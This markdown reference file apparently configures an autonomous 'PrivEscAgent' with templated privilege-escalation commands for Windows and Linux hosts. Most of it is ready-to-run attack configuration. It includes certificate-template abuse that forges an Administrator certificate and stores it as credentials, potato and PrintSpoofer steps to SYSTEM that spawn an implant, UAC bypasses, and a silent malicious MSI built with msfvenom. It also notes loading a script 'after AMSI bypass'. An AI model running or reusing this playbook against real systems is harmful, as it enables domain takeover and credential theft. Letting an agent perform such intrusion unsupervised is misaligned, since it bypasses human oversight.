# Privilege Escalation — Tool commands reference

Templated commands the `PrivEscAgent` dispatches via the Execution Layer.
Placeholders documented in
[../../discovering-environment/reference/tool-commands.md](../../discovering-environment/reference/tool-commands.md).

## Contents
- seatbelt, winpeas, powerup (P1)
- certify, certipy (P2)
- printspoofer, godpotato (P3)
- uacme (P6)
- accesschk (P4/P5)
- msfvenom + msiexec (P7)
- procmon (P8/P9)
- linpeas (P11)

## `seatbelt`  (P1)

```yaml
tool: seatbelt
opsec: moderate
commands:
  - id: triage
    cmd: "Seatbelt.exe -group=remote -outputfile={{ artifact.path }}/seatbelt.json"
    parser: parsers.seatbelt_json
  - id: privileges
    cmd: "Seatbelt.exe TokenPrivileges TokenGroups UACSystemPolicies AMSIProviders PowerShellSettings"
    parser: parsers.seatbelt_text
```

## `winpeas`  (P1)

```yaml
tool: winpeas
opsec: loud
commands:
  - id: fast
    cmd: "winPEASx64.exe systeminfo userinfo processinfo applicationsinfo servicesinfo -log {{ artifact.path }}/winpeas.txt"
    parser: parsers.winpeas
```

## `powerup`  (P1)

```yaml
tool: powerup
opsec: moderate
notes: "Load via IEX after AMSI bypass."
commands:
  - id: all_checks
    cmd: "Invoke-AllChecks | ConvertTo-Json -Depth 4"
    parser: parsers.powerup_json
    on_success:
      - "for each finding with abuse function, append finding with priority"
```

## `certify`  (P2 Windows)

```yaml
tool: certify
opsec: stealth
commands:
  - id: find_vuln
    cmd: "Certify.exe find /vulnerable /json"
    parser: parsers.certify_json
  - id: request_esc1
    cmd: |
      Certify.exe request /ca:'{{ adcs.ca_dn }}' \
        /template:'{{ esc.template_name }}' \
        /altname:'{{ context.scope.domains[0] }}\Administrator' /json
    parser: parsers.certify_request
    on_success:
      - "store pfx as credentials[] secret_type=cert_pfx username=Administrator"
      - "set pivot hint = accessing-credentials (pkinit_to_tgt)"
```

## `certipy`  (P2 Linux, often more reliable)

```yaml
tool: certipy
opsec: stealth
commands:
  - id: req_esc1
    cmd: |
      certipy req -u '{{ creds.primary.username }}@{{ context.scope.domains[0] }}' \
        {{ creds.primary | as_certipy_secret }} \
        -dc-ip {{ hosts.first(role='DC').ip }} \
        -ca '{{ adcs.ca_name }}' -template '{{ esc.template_name }}' \
        -upn 'administrator@{{ context.scope.domains[0] }}' \
        -out {{ artifact.path }}/admin.pfx
    parser: parsers.certipy
```

## `printspoofer` / `godpotato`  (P3)

```yaml
tool: printspoofer
opsec: moderate
preconditions:
  - "host.current.privileges contains 'SeImpersonatePrivilege'"
  - "host.current.os in ['Win10','Server2019','Server2022']"
commands:
  - id: to_system
    cmd: 'PrintSpoofer.exe -i -c "cmd /c whoami > {{ artifact.path }}/who.txt && {{ implant.spawn_cmd }}"'
    parser: parsers.process_whoami
    on_success:
      - "update hosts[current].access_level=system"
      - "update context.initial_access.integrity=HIGH"

tool: godpotato
opsec: moderate
preconditions:
  - "host.current.privileges contains 'SeImpersonatePrivilege'"
commands:
  - id: to_system
    cmd: 'GodPotato.exe -cmd "cmd /c {{ implant.spawn_cmd }}"'
    parser: parsers.process_whoami
```

## `uacme`  (P6)

```yaml
tool: uacme
opsec: moderate
preconditions:
  - "host.current.integrity == 'MEDIUM'"
  - "host.current.user_in_local_admins == true"
commands:
  - id: fodhelper
    cmd: "Akagi64.exe 33 {{ implant.spawn_cmd }}"
    parser: parsers.process_whoami
    on_failure:
      fallback: cmstp
  - id: cmstp
    cmd: "Akagi64.exe 41 {{ implant.spawn_cmd }}"
    parser: parsers.process_whoami
```

## `accesschk`  (P4 / P5)

```yaml
tool: accesschk
opsec: moderate
commands:
  - id: writable_services
    cmd: "accesschk.exe -uwcqv 'Authenticated Users' * /accepteula"
    parser: parsers.accesschk
  - id: writable_binpath_dirs
    cmd: "accesschk.exe -uwdqs 'Authenticated Users' C:/"
    parser: parsers.accesschk
```

## `msfvenom` + `msiexec`  (P7)

```yaml
tool: msfvenom
opsec: loud
preconditions:
  - "registry.HKLM.AlwaysInstallElevated == 1 and registry.HKCU.AlwaysInstallElevated == 1"
commands:
  - id: build_msi
    cmd: "msfvenom -p windows/x64/exec CMD='{{ implant.spawn_cmd }}' -f msi -o {{ artifact.path }}/p.msi"
    parser: parsers.file_artifact
  - id: install
    cmd: 'msiexec /quiet /qn /i "{{ artifact.path }}/p.msi"'
    parser: parsers.process_whoami
```

## `procmon`  (P8 / P9 — usually human-assisted)

```yaml
tool: procmon
opsec: loud
commands:
  - id: capture
    cmd: "Procmon.exe /AcceptEula /Quiet /Minimized /Backingfile {{ artifact.path }}/pml.pml"
    parser: parsers.procmon_dll_misses
```

## `linpeas`  (P11)

```yaml
tool: linpeas
opsec: loud
preconditions:
  - "host.current.os startswith 'Linux'"
commands:
  - id: triage
    cmd: "bash linpeas.sh -a > {{ artifact.path }}/linpeas.txt"
    parser: parsers.linpeas
```
